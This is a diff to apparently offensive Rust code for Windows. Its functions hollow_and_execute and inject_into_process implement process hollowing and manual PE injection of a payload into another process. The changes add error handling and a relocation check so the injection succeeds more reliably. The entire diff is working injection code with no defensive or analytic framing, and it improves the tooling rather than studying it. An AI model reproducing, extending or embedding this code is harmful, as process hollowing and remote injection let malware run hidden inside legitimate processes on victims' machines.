@@ -94,8 +94,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
 
                 let mut ctx: CONTEXT = zeroed();
                 ctx.ContextFlags = CONTEXT_FULL;
-                GetThreadContext(pi.hThread, &mut ctx);
-
+                if GetThreadContext(pi.hThread, &mut ctx) == 0 {
+                    tracing::warn!("hollow_and_execute: GetThreadContext failed ({}); skipping unmap",
+                        winapi::um::errhandlingapi::GetLastError());
+                } else {
                 // In a newly created x64 process, Rdx holds the PEB address
                 let peb_ptr = ctx.Rdx as *const u8;
                 let mut remote_image_base: usize = 0;
@@ -106,10 +108,15 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                     std::mem::size_of::<usize>(),
                     null_mut(),
                 );
+                if remote_image_base == 0 {
+                    tracing::warn!("hollow_and_execute: remote_image_base is NULL; skipping unmap");
+                } else {
                 let unmap_status = nt_unmap(pi.hProcess, remote_image_base as _);
                 if unmap_status < 0 {
                     tracing::warn!("hollow_and_execute: NtUnmapViewOfSection returned 0x{:x}; continuing", unmap_status);
                 }
+                } // remote_image_base != 0
+                } // GetThreadContext succeeded
             }
         }
 
@@ -349,10 +356,27 @@ pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
             let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
             let ep_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
 
+            // 4.1: Verify the PE can be relocated if we cannot map at its preferred
+            // base.  A PE without a relocation directory (.reloc section / reloc
+            // DataDirectory) that is loaded at a different address will have all
+            // absolute addresses broken — refuse to inject rather than inject
+            // silently broken code.
+            let reloc_dir = (*nt).OptionalHeader.DataDirectory[winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+            let has_relocs = reloc_dir.VirtualAddress != 0 && reloc_dir.Size != 0;
+
             let remote_mem = VirtualAllocEx(
                 hprocess, preferred_base as _, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE,
             );
             let remote_mem = if remote_mem.is_null() {
+                if !has_relocs {
+                    // Cannot load at preferred base and there is no reloc table.
+                    close_h!(hprocess);
+                    return Err(anyhow!(
+                        "inject_into_process(pid={}): PE has no relocation directory and preferred \
+                         base 0x{:x} is not available; cannot load at an alternative address",
+                        pid, preferred_base
+                    ));
+                }
                 VirtualAllocEx(hprocess, null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
             } else { remote_mem };
 
